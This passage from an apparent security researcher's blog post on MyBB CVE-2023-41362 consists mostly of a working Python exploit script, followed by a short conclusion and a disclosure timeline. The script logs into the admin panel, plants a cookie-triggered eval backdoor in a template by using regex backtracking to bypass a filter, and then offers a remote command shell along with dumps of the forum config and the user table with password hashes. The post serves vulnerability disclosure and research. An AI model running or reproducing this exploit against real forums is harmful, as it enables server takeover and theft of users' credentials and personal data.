</span></span><span style="display:flex;"><span>logger<span style="color:#f92672">.</span>setLevel(logging<span style="color:#f92672">.</span>INFO)
</span></span><span style="display:flex;"><span>ch <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>StreamHandler()
</span></span><span style="display:flex;"><span>ch<span style="color:#f92672">.</span>setFormatter(CustomFormatter())
</span></span><span style="display:flex;"><span>logger<span style="color:#f92672">.</span>addHandler(ch)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_postkey</span>(text):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> text<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;my_post_key&#34; value=&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_php</span>(php_code):
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/online.php&#34;</span>,cookies<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;1&#39;</span>:b64encode(php_code<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()})<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">remove</span>():
</span></span><span style="display:flex;"><span>	logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Removing payload from template&#34;</span>)
</span></span><span style="display:flex;"><span>	rm_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$db-&gt;query(&#34;UPDATE {$db-&gt;table_prefix}templates SET template=SUBSTRING_INDEX(template,</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">}--&gt;</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">,-1) WHERE template LIKE </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">%[0][0][0][0]%</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#34;);&#39;</span>
</span></span><span style="display:flex;"><span>	send_php(rm_payload)
</span></span><span style="display:flex;"><span>	logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Payload removed&#34;</span>)
</span></span><span style="display:flex;"><span>	exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_config</span>():
</span></span><span style="display:flex;"><span>	dump_config_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;print_r($config);&#39;</span>
</span></span><span style="display:flex;"><span>	print(send_php(dump_config_payload))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dump_users</span>():
</span></span><span style="display:flex;"><span>	users_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;$q=$db-&gt;query(&#34;SELECT CONCAT_WS(</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">,</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">,uid,username,email,hex(regip),hex(lastip),password,salt) as x FROM {$db-&gt;table_prefix}users&#34;);while($r=$db-&gt;fetch_array($q)){print($r[</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">x</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">].PHP_EOL);}die();&#39;</span>
</span></span><span style="display:flex;"><span>	logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Saving user table to </span><span style="color:#e6db74">{</span>domain<span style="color:#e6db74">}</span><span style="color:#e6db74">.txt&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>domain<span style="color:#e6db74">}</span><span style="color:#e6db74">.txt&#34;</span>,<span style="color:#e6db74">&#39;w&#39;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(send_php(users_payload))
</span></span><span style="display:flex;"><span>	logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Complete&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shell</span>():
</span></span><span style="display:flex;"><span>	logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Testing code exec...&#34;</span>)
</span></span><span style="display:flex;"><span>	page <span style="color:#f92672">=</span> send_php(<span style="color:#e6db74">&#39;echo &#34;lmao&#34;;&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;lmao&#39;</span> <span style="color:#f92672">in</span> page:
</span></span><span style="display:flex;"><span>		logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Shell is working&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#34;Shell doesnt seem to work correctly&#34;</span>)
</span></span><span style="display:flex;"><span>	logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Special commands: exit (quit), remove (removes backdoor), config (prints mybb config), dump (dumps user table)&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>		command <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter Command&gt; &#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> command <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;exit&#39;</span>,<span style="color:#e6db74">&#39;quit&#39;</span>]:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remove&#39;</span>:
</span></span><span style="display:flex;"><span>			remove()
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;config&#39;</span>:
</span></span><span style="display:flex;"><span>			dump_config()
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> command <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;dump&#39;</span>:
</span></span><span style="display:flex;"><span>			dump_users()
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		command <span style="color:#f92672">=</span> command<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&#39;&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>		page <span style="color:#f92672">=</span> send_php(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;system(&#39;</span><span style="color:#e6db74">{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;);&#34;</span>)
</span></span><span style="display:flex;"><span>		print(page)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>	parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;MyBB CVE-2023-41362 Exploit Script&#34;</span>)
</span></span><span style="display:flex;"><span>	parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;target&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Target URL (e.g., https://example.com)&#34;</span>)
</span></span><span style="display:flex;"><span>	parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;username&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Admin username&#34;</span>)
</span></span><span style="display:flex;"><span>	parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;password&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Admin password&#34;</span>)
</span></span><span style="display:flex;"><span>	parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--admincp&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Admin control panel path&#34;</span>)
</span></span><span style="display:flex;"><span>	parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;--user-agent&#34;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User Agent&#34;</span>)
</span></span><span style="display:flex;"><span>	args <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
</span></span><span style="display:flex;"><span>	target <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span>	domain <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>target<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;://&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;/&#39;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>	admincp_path <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>admincp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># login to admin</span>
</span></span><span style="display:flex;"><span>	session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>	session<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>update({<span style="color:#e6db74">&#34;User-Agent&#34;</span>:args<span style="color:#f92672">.</span>user_agent})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Logging into </span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>admincp_path<span style="color:#e6db74">}</span><span style="color:#e6db74">/ as </span><span style="color:#e6db74">{</span>args<span style="color:#f92672">.</span>username<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>	login <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>admincp_path<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>:args<span style="color:#f92672">.</span>username, <span style="color:#e6db74">&#34;password&#34;</span>:args<span style="color:#f92672">.</span>password, <span style="color:#e6db74">&#34;do&#34;</span>:<span style="color:#e6db74">&#34;login&#34;</span>})
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;&lt;p id=&#34;message&#34; class=&#34;error&#34;&gt;&#39;</span> <span style="color:#f92672">in</span> login<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>		logger<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Login Failed&#34;</span>)
</span></span><span style="display:flex;"><span>		exit()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;This account has been locked out&#39;</span> <span style="color:#f92672">in</span> login<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>		logger<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Account has been locked out for failing login too many times&#34;</span>)
</span></span><span style="display:flex;"><span>		exit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># we should have admin panel access now</span>
</span></span><span style="display:flex;"><span>	page <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>admincp_path<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php?module=style-templates&amp;action=edit_template&amp;title=online&amp;sid=1&#34;</span>)<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span>	postkey <span style="color:#f92672">=</span> get_postkey(page)
</span></span><span style="display:flex;"><span>	existing_template <span style="color:#f92672">=</span> html<span style="color:#f92672">.</span>unescape(page<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&lt;textarea name=&#34;template&#34; class=&#34;&#34; id=&#34;template&#34; style=&#34;width: 100%; height: 500px;&#34; rows=&#34;5&#34; cols=&#34;45&#34;&gt;&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&lt;/textarea&gt;&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>	tid <span style="color:#f92672">=</span> page<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;tid&#34; value=&#34;&#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;&#34;&#39;</span>)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># using html comment to hide the insert_id() response of 0</span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># payload uses a lot of [0]&#39;s to trigger catastrophic regex backtracking to bypass filter</span>
</span></span><span style="display:flex;"><span>	payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;!--{$db-&gt;insert_id(isset($_COOKIE[1])?die(eval(base64_decode($_COOKIE[1]))):&#39;&#39;)}{$a&#34;</span><span style="color:#f92672">+</span>(<span style="color:#e6db74">&#34;[0]&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2000</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;}--&gt;&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;[0][0][0][0][0]&#39;</span> <span style="color:#f92672">in</span> existing_template:
</span></span><span style="display:flex;"><span>		logger<span style="color:#f92672">.</span>warning(<span style="color:#e6db74">&#39;Template already contains our payload code? Skipping to sending commands...&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>		page <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>admincp_path<span style="color:#e6db74">}</span><span style="color:#e6db74">/index.php?module=style-templates&amp;action=edit_template&#34;</span>,data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;my_post_key&#39;</span>:postkey, <span style="color:#e6db74">&#39;tid&#39;</span>:tid,<span style="color:#e6db74">&#39;title&#39;</span>:<span style="color:#e6db74">&#39;online&#39;</span>,<span style="color:#e6db74">&#39;sid&#39;</span>:<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;template&#39;</span>:<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}{</span>existing_template<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;continue&#34;</span>:<span style="color:#e6db74">&#34;Save and Continue Editing&#34;</span>})
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;The selected template has successfully been saved.&#34;</span> <span style="color:#f92672">in</span> page<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>			logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Template saved!&#34;</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			logger<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#34;Template failed to save&#34;</span>)
</span></span><span style="display:flex;"><span>	shell()
</span></span></code></pre></div><h1 id="conclusion" >Conclusion
<span>
    <a href="#conclusion">
        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
    </a>
</span>
</h1><p>In conclusion, this vulnerability in MyBB&rsquo;s admin panel highlights the importance of rigorously checking the return values of PHP&rsquo;s PCRE functions, <a href="https://github.com/mybb/mybb/commit/a43a6f22944e769a6eabc58c39e7bc18c1cab4ca.patch">as MyBB did in their patch</a>, because the functions will return False on failure (which is different to the return value 0 when they don&rsquo;t match).
PHP also provides the <a href="https://www.php.net/manual/en/function.preg-last-error-msg.php">preg_last_error_msg()</a> and <a href="https://www.php.net/manual/en/function.preg-last-error.php">preg_last_error()</a> functions which may be useful.</p>
<p>For web application security testers, we hope this post serves as a valuable resource for understanding and identifying similar issues. If you find any please let me know about it by email or on Fedi/Twitter.</p>
<h1 id="timeline" >Timeline
<span>
    <a href="#timeline">
        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
    </a>
</span>
</h1><table>
<thead>
<tr>
<th>Date</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<tr>
<td>12/08/2023</td>
<td>Reported bug to <a href="https://www.zerodayinitiative.com/">ZDI</a></td>
</tr>
<tr>
<td>24/08/2023</td>
<td>ZDI Rejected the bug on the grounds that a high level of admin access is required</td>
</tr>
<tr>
<td>25/08/2023</td>
<td>Reported issue to MyBB</td>
</tr>
<tr>
<td>28/08/2023</td>
<td><a href="https://github.com/mybb/mybb/security/advisories/GHSA-pr74-wvp3-q6f5">Patch and advisory released</a></td>
</tr>
<tr>
<td>30/08/2023</td>
<td>Number <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-41362">CVE-2023-41362</a> assigned</td>
</tr>
<tr>
<td>11/09/2023</td>
<td>Blog post and <a href="https://github.com/SorceryIE/CVE-2023-41362_MyBB_ACP_RCE">exploit</a> released</td>
</tr>
</tbody>
</table>

        </div>
        

    



<div class="post-info">
    
        <div class="post-date dt-published">
            <a class="u-url" href="/posts/mybb_acp_rce/"><time datetime="2023-09-11">2023-09-11</time></a>
            
        </div>
    

    <a class="post-hidden-url u-url" href="https://blog.sorcery.ie/posts/mybb_acp_rce/">https://blog.sorcery.ie/posts/mybb_acp_rce/</a>
    <a href="https://blog.sorcery.ie/" class="p-name p-author post-hidden-author h-card" rel="me">Sorcery Ltd</a>


    <div class="post-taxonomies">
        
        
            <ul class="post-tags">
                
                    
                    <li><a href="https://blog.sorcery.ie/tags/mybb/">#Mybb</a></li>
                
                    
                    <li><a href="https://blog.sorcery.ie/tags/rce/">#Rce</a></li>
                
                    
                    <li><a href="https://blog.sorcery.ie/tags/regex/">#Regex</a></li>
                
                    
                    <li><a href="https://blog.sorcery.ie/tags/cve-2023-41362/">#CVE-2023-41362</a></li>
                
                    
                    <li><a href="https://blog.sorcery.ie/tags/redos/">#Redos</a></li>
                
            </ul>
        
        
    </div>
</div>

    </article>

    

    
        
    
    
    <div class="pagination post-pagination">
        <div class="left pagination-item ">
            
                <a href="/posts/cfor_exploit/">CFOR Exploit - Recovering Deleted and Private Github Commits</a>
            
        </div>
        <div class="right pagination-item ">
            
                <a href="/posts/myprestamodules_phpinfo/">PHPInfo Exposure in MyPrestaModules Modules CVE-2023-39677</a>
            
        </div>
    </div>




    

    
        







    

        </main>
        
            <footer class="common-footer">
    
    

    <div class="common-footer-bottom">
        
        <div class="copyright">
            <p>© Sorcery Ltd, 2024<br>
            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
            
            </p>  
        </div> 

        

    




    <button class="theme-switcher">
        Dark theme
    </button>


<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="678f3b8a7d1349265c8fb8d9-text/javascript">
const STORAGE_KEY = 'user-color-scheme'
const defaultTheme = "light"

let currentTheme
let switchButton
let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')

const autoChangeScheme = e => {
    currentTheme = e.matches ? 'dark' : 'light'
    document.documentElement.setAttribute('data-theme', currentTheme)
    changeButtonText()
}

document.addEventListener('DOMContentLoaded', function() {
    switchButton = document.querySelector('.theme-switcher')
    currentTheme = detectCurrentScheme()
    if (currentTheme == 'dark') {
        document.documentElement.setAttribute('data-theme', 'dark')
    }
    if (currentTheme == 'auto') {
        autoChangeScheme(autoDefinedScheme);
        autoDefinedScheme.addListener(autoChangeScheme);
    }

    if (switchButton) {
        changeButtonText()
        switchButton.addEventListener('click', switchTheme, false)
    }
  
    showContent()
})

function detectCurrentScheme() {
    if (localStorage !== null && localStorage.getItem(STORAGE_KEY)) {
        return localStorage.getItem(STORAGE_KEY)
    } 
    if (defaultTheme) {
        return defaultTheme
    } 
    if (!window.matchMedia) {
        return 'light'
    } 
    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        return 'dark'
    }
    return 'light'
}

function changeButtonText()
{   
    if (switchButton) {
        switchButton.textContent = currentTheme == 'dark' ?  "Light theme" : "Dark theme"
    }
}

function switchTheme(e) {
    if (currentTheme == 'dark') {
        if (localStorage !== null)
            localStorage.setItem(STORAGE_KEY, 'light')
        document.documentElement.setAttribute('data-theme', 'light')
        currentTheme = 'light'
    } else {
        if (localStorage !== null)
            localStorage.setItem(STORAGE_KEY, 'dark')
        document.documentElement.setAttribute('data-theme', 'dark')
        currentTheme = 'dark'
    }
    changeButtonText()
}

function showContent() {
    document.body.style.visibility = 'visible';
    document.body.style.opacity = 1;
}
</script>

   
    </div>

    <p class="h-card vcard">

    <a href=https://blog.sorcery.ie/ class="p-name u-url url fn" rel="me">Sorcery Ltd</a> 

    

    
</p> 
</footer>

        
    </div>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="678f3b8a7d1349265c8fb8d9-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"8fff65575edbe911","version":"2024.10.5","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"3cd44e860e8443829b2d99041058f83f","b":1}' crossorigin="anonymous"></script>
</body>
</html>
